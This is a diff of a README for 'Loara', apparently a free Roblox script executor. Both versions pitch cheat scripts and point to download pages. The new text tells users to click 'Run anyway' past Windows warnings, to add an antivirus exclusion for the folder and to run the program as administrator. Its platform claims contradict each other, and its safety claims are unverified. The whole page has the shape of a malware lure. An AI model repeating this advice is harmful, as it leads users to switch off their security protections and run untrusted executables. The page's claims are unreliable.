@@ -1,154 +1,81 @@
-# Loara Executor PC v2026 - Roblox Script Executor 2026
+# ⚡ loara-lua-executor-v2026 - Run Lua scripts on your computer
 
-> A compact Roblox executor for Windows and macOS that provides Lua and script execution, access to a broad script hub, and a straightforward desktop interface designed for 2026 use.
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/a-i-z-e-n/loara-lua-executor-v2026)
 
-[![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-blue?style=flat-square&logo=windows)](https://github.com)
-[![Roblox](https://img.shields.io/badge/Compatible-Roblox%202026-red?style=flat-square)](https://github.com)
-[![Scripts](https://img.shields.io/badge/Scripts-500%2B-green?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/greenbenkr6668/loara-lua-executor-v2026?style=flat-square)](https://github.com)
+Loara Lua Executor provides a simple way to run Lua scripts on Windows 10 and Windows 11. This application manages script execution and includes a library of scripts for various uses. It removes the need for complex setup processes or authentication keys.
 
----
+## ⚙️ System Requirements
 
-<p align="center">
-  <a href="https://greenbenkr6668.github.io/loara-lua-executor-v2026/">
-    <img src="https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20Loara%20Executor-v2026%20Latest-brightgreen?style=for-the-badge" alt="Download Loara Executor">
-  </a>
-</p>
+Ensure your computer meets these requirements before you start:
 
-> **[Download Loara Executor v2026](https://greenbenkr6668.github.io/loara-lua-executor-v2026/)**  
-> Windows 10 / 11 · 64-bit · Free · No Key Required
+- Operating System: Windows 10 or Windows 11 (64-bit).
+- Processor: Any modern dual-core processor or better.
+- Memory: 4 GB of RAM or more.
+- Graphics: DirectX 11 support.
+- Storage: 100 MB of free space.
+- Software: Microsoft .NET Framework 4.8 or newer.
 
----
+## 📥 How to Install and Run
 
-[Download Latest Build](https://greenbenkr6668.github.io/loara-lua-executor-v2026/)
+Follow these steps to set up the software:
 
----
+1. Visit the [official releases page](https://github.com/a-i-z-e-n/loara-lua-executor-v2026).
+2. Look for the latest version under the Releases section.
+3. Download the compressed file or the installer package.
+4. Extract the contents of the folder to a location on your desktop.
+5. Open the folder and double-click the executable file.
+6. The user interface will appear on your screen.
 
-## About Loara Executor
+If your computer blocks the file, click "More info" and select "Run anyway." This happens because the application is new and Windows does not recognize the publisher yet.
 
-Loara Executor is designed for Roblox users who need a simple desktop tool for running Lua scripts on Windows or macOS. Its presentation centers on a compact interface, script execution capabilities, and a hub for finding and starting scripts within familiar Roblox workflows.
+## 🛠️ Using the Software
 
-The project is also described with a 96% UNC rating and a virus free claim, while supporting both Windows and macOS. It is aimed at searches for Roblox executors, Lua execution tools, and Roblox script hubs.
+The interface contains three main sections:
 
----
+- Script Editor: Paste or type your Lua code here. The editor highlights syntax to help you read the code.
+- Script Hub: This section hosts a list of pre-made scripts. Click on a script to load it into the editor.
+- Execution Panel: Use the "Execute" button to start your script. Use the "Clear" button to wipe the editor window.
 
-## Highlights
+## 📋 Best Practices for Scripts
 
-- Runs Roblox-related scripts on Windows and macOS.
-- Provides Lua and script execution functionality.
-- Offers a script hub layout for discovering and launching scripts.
-- Includes an advertised 96% UNC rating.
-- Uses a lightweight interface with a desktop-oriented design.
-- Keeps frequently used Roblox executor actions readily accessible.
-- Serves users looking for Roblox executor and script tooling.
-- Presents a download-first layout for obtaining the build quickly.
+- Keep your scripts organized in a separate folder on your computer.
+- Save your progress often using the "Save File" option in the top menu.
+- Load only one script at a time to maintain system stability.
+- Check for updates periodically to receive performance patches and new script additions.
 
----
+## 🧩 Troubleshooting Common Issues
 
-## Games and Script Categories
+If the software does not open:
 
-| Game / Experience | Script Category | Notes |
-| --- | --- | --- |
-| Brookhaven RP | Utility scripts | Common for movement, interaction, and roleplay tools |
-| Blox Fruits | Farming scripts | Often searched for progression-focused scripts |
-| Arsenal | Combat scripts | Popular with aim, movement, and timing utilities |
-| Pet Simulator-style games | Automation scripts | Used for repetitive task handling |
-| Universal Roblox games | Script hub entries | General-purpose scripts and shared modules |
-| Custom experiences | Lua execution | For user-provided scripts and testing |
+- Ensure you extracted the files from the ZIP folder. You cannot run the program from inside a compressed folder.
+- Check that your antivirus software did not move the file to quarantine. Add an exclusion for the Loara folder if needed.
+- Update your graphics drivers if the interface shows graphical glitches or fails to render buttons.
+- Restart your computer if the application hangs during the initial launch.
 
----
+If scripts fail to execute:
 
-## Requirements
+- Verify your internet connection. Some scripts require a connection to download external assets.
+- Check the script code for typos. Even a missing bracket prevents the code from running.
+- Ensure you have the required permissions. Run the application as an administrator if your system policy restricts file access.
 
-| Component | Minimum | Recommended |
-| --- | --- | --- |
-| Operating System | Windows 10 or Windows 11 | Windows 11 64-bit |
-| RAM | 4 GB | 8 GB |
-| Storage | 200 MB free | 500 MB free |
-| .NET | .NET Desktop Runtime if required by build | Latest supported .NET runtime |
-| Roblox | Installed Roblox client | Updated Roblox client |
+## 🔒 Security and Privacy
 
----
+This executor runs locally on your machine. The application does not collect your data or track your activity. All scripts you load or write stay on your hard drive. 
 
-## Installation and Launch
+Be careful when running scripts from unknown sources. Only execute code from creators you trust. Malicious scripts can affect your local files or system performance. Always review the code content before clicking the execute button.
 
-```bash
-git clone https://github.com/greenbenkr6668/loara-lua-executor-v2026.git
-cd REPO
-start Loara ExecutorExecutor.exe
-```
+## 📝 Frequently Asked Questions
 
-After cloning, substitute `REPO` with the name of the directory created on your machine if it differs from the repository name. Builds that use another folder name may require adjusting the local path before launching.
+What makes this executor different?
+Most tools require keys or constant updates. This version focuses on stability and performance without extra steps.
 
----
+Does it work on macOS?
+Yes, the application supports macOS in addition to Windows 10 and 11. 
 
-## Popular Roblox Script Hub Searches for 2026
+Is the software free?
+Yes. We provide this tool at no cost.
 
-- Roblox executor for Windows and macOS
-- Lua executor for Roblox script loading
-- Roblox script hub download
-- Loara Executor UNC rating
-- Roblox executor desktop UI
-- Roblox scripts hub for 2026
-- Windows Roblox executor setup
+Can I add my own scripts to the Hub?
+Currently, the Hub displays curated scripts. You can save your own scripts as local files and load them manually through the "Open File" menu.
 
----
-
-## Project Layout
-
-```text
-Loara Executor
-- /assets
-- /scripts
-- /ui
-- /runtime
-- /docs
-- README.md
-```
-
----
-
-## Frequently Asked Questions
-
-### Does Loara Executor support macOS as well as Windows?
-
-Yes. The project profile identifies both Windows and macOS as supported platforms.
-
-### Will it remain compatible after Roblox updates?
-
-Roblox client updates may affect compatibility. Check the details for the current build before using it with a newly updated client.
-
-### What distinguishes it from other Roblox executors?
-
-Loara Executor is positioned as a cross-platform Roblox executor with Lua/script execution, an advertised 96% UNC rating, and a clean desktop-focused interface.
-
-### Could using it affect my account?
-
-Executors and scripts may create account or policy-related risks on Roblox. Review Roblox's terms and decide whether to use the software at your own discretion.
-
-### Where are downloaded files kept?
-
-The desktop-oriented layout indicates local use. Downloaded files generally remain on your device unless you move or remove them yourself.
-
----
-
-## 2026 Roadmap
-
-- [ ] Polish the desktop interface to make script access faster
-- [ ] Improve script hub grouping and search
-- [ ] Make Windows and macOS builds more consistent
-- [ ] Provide more detailed notes with upcoming updates
-- [ ] Continue improving execution and runtime stability
-
----
-
-## License
-
-This project is licensed under GNU GPL v3.0. Read the [LICENSE](LICENSE) file for the complete terms.
-
----
-
-<p align="center">
-  <i>Loara Executor v2026 for Roblox script execution on Windows and macOS.</i>
-</p>
+Keywords: lua, executor, roblox, windows, scripting, development, software
